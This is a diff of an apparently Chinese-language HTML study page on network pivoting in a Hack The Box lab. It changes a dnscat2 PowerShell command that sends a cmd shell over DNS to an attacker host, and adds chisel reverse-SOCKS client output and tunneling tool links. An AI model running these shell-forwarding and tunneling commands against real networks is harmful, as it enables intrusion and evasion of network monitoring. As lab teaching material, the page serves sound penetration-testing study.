@@ -64,7 +64,7 @@ Backconnecting to server 10.10.14.18 port 9999
 <h4 id="Importing-dnscat2-ps1"><a href="#Importing-dnscat2-ps1" class="headerlink" title="Importing dnscat2.ps1"></a>Importing dnscat2.ps1</h4><pre><code class="powershell-session">PS C:\htb&gt; Import-Module .\dnscat2.ps1
 </code></pre>
 <p>导入dnscat2.ps1后，我们可以使用它与运行在我们攻击主机上的服务器建立隧道。我们可以将CMD shell会话发送回我们的服务器。</p>
-<pre><code class="powershell-session">PS C:\htb&gt; Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+<pre><code class="powershell-session">PS C:\htb&gt; Start-Dnscat2 -DNSserver 10.10.14.47 -Domain inlanefreight.local -PreSharedSecret 166752dc4191131dce8195327eb078fe -Exec cmd 
 </code></pre>
 <p>我们必须使用服务器上生成的预共享机密（-PreSharedSecret）来确保我们的会话已建立并加密。如果所有步骤都成功完成，我们将看到与服务器建立的会话。</p>
 <h4 id="Confirming-Session-Establishment"><a href="#Confirming-Session-Establishment" class="headerlink" title="Confirming Session Establishment"></a>Confirming Session Establishment</h4><pre><code class="shell-session">New window created: 1
@@ -174,6 +174,14 @@ socks5 127.0.0.1 1080
 # socks4    127.0.0.1 9050
 socks5 127.0.0.1 1080 
 </code></pre>
+<pre><code class="shell-session">ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
+
+2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
+2022/05/30 14:19:29 client: Handshaking...
+2022/05/30 14:19:30 client: Sending config
+2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
+2022/05/30 14:19:30 client: tun: SSH connected
+</code></pre>
 <p>如果我们将proxychains与RDP一起使用，我们可以通过我们创建的到Pivot主机的隧道连接到内部网络上的DC。</p>
 <pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 </code></pre>
@@ -221,8 +229,8 @@ Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
 </code></pre>
 <h2 id="Network-Traffic-Analysis-Considerations"><a href="#Network-Traffic-Analysis-Considerations" class="headerlink" title="Network Traffic Analysis Considerations"></a>Network Traffic Analysis Considerations</h2><p>重要的是，我们要确认我们正在使用的工具是否如广告所示，并且我们已经设置并正确操作了它们。在使用ICMP隧道通过本节中教导的不同协议对流量进行隧道传输的情况下，我们可以从使用Wireshark等数据包分析器分析生成的流量中受益。仔细看一下下面的短片。</p>
 <p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041725504.gif" alt="img"></p>
-<p>在这个片段的第一部分中，通过SSH建立连接，而不使用ICMP隧道。我们可能会注意到，TCP&amp;SSHv2流量被捕获。 剪辑中使用的命令：<a href="mailto:&#x73;&#x73;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#117;&#x40;&#x31;&#48;&#46;&#49;&#50;&#57;&#46;&#x32;&#x30;&#x32;&#x2e;&#54;&#52;">&#x73;&#x73;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#117;&#x40;&#x31;&#48;&#46;&#49;&#50;&#57;&#46;&#x32;&#x30;&#x32;&#x2e;&#54;&#52;</a> 在本片段的第二部分中，使用ICMP隧道通过SSH建立连接。请注意执行此操作时捕获的流量类型。 剪辑中使用的命令：ssh-p222-lubuntu 127.0.0.1</p>
-<h1 id="RDP-and-SOCKS-Tunneling-with-SocksOverRDP"><a href="#RDP-and-SOCKS-Tunneling-with-SocksOverRDP" class="headerlink" title="RDP and SOCKS Tunneling with SocksOverRDP"></a>RDP and SOCKS Tunneling with SocksOverRDP</h1><p>在评估过程中，有时我们可能仅限于Windows网络，并且可能无法使用SSH进行数据透视。在这种情况下，我们必须使用适用于Windows操作系统的工具。SocksOverRDP是一个使用Windows远程桌面服务功能中的动态虚拟频道（DVC）的工具示例。DVC负责通过RDP连接对数据包进行隧道传输。使用此功能的一些示例是剪贴板数据传输和音频共享。然而，此功能也可用于通过网络传输任意数据包。我们可以使用SocksOverRDP来传输我们的自定义数据包，然后通过它进行代理。我们将使用工具Proxifier作为我们的代理服务器。 我们可以从将适当的二进制文件下载到我们的攻击主机开始执行此攻击。在我们的攻击主机上拥有二进制文件将使我们能够将它们转移到需要的每个目标。我们需要：</p>
+<p>在这个片段的第一部分中，通过SSH建立连接，而不使用ICMP隧道。我们可能会注意到，TCP&amp;SSHv2流量被捕获。 剪辑中使用的命令：<a href="mailto:&#115;&#115;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#x75;&#x40;&#x31;&#x30;&#x2e;&#x31;&#50;&#x39;&#46;&#x32;&#48;&#50;&#x2e;&#54;&#52;">&#115;&#115;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#x75;&#x40;&#x31;&#x30;&#x2e;&#x31;&#50;&#x39;&#46;&#x32;&#48;&#50;&#x2e;&#54;&#52;</a> 在本片段的第二部分中，使用ICMP隧道通过SSH建立连接。请注意执行此操作时捕获的流量类型。 剪辑中使用的命令：ssh-p222-lubuntu 127.0.0.1</p>
+<h1 id="RDP-and-SOCKS-Tunneling-with-SocksOverRDP"><a href="#RDP-and-SOCKS-Tunneling-with-SocksOverRDP" class="headerlink" title="RDP and SOCKS Tunneling with SocksOverRDP"></a>RDP and SOCKS Tunneling with SocksOverRDP</h1><p>在评估过程中，有时我们可能仅限于Windows网络，并且可能无法使用SSH进行数据透视。在这种情况下，我们必须使用适用于Windows操作系统的工具。<a target="_blank" rel="noopener" href="https://github.com/nccgroup/SocksOverRDP">SocksOverRDP</a>是一个使用Windows远程桌面服务功能中的动态虚拟频道（DVC）的工具示例。DVC负责通过RDP连接对数据包进行隧道传输。使用此功能的一些示例是剪贴板数据传输和音频共享。然而，此功能也可用于通过网络传输任意数据包。我们可以使用SocksOverRDP来传输我们的自定义数据包，然后通过它进行代理。我们将使用工具 <a target="_blank" rel="noopener" href="https://www.proxifier.com/">Proxifier</a>作为我们的代理服务器。 我们可以从将适当的二进制文件下载到我们的攻击主机开始执行此攻击。在我们的攻击主机上拥有二进制文件将使我们能够将它们转移到需要的每个目标。我们需要：</p>
 <p> <a target="_blank" rel="noopener" href="https://github.com/nccgroup/SocksOverRDP/releases">SocksOverRDP x64 Binaries</a>二进制文件</p>
 <p><a target="_blank" rel="noopener" href="https://www.proxifier.com/download/#win-tab">Proxifier Portable Binary</a></p>
 <p> 我们可以查找ProxifierPE.zip 然后，我们可以使用xfreerdp连接到目标，并将SocksOverRDP64.zip文件复制到目标。然后，我们需要从Windows目标加载使用regsvr32.exe的SocksOverRDP.dll。</p>
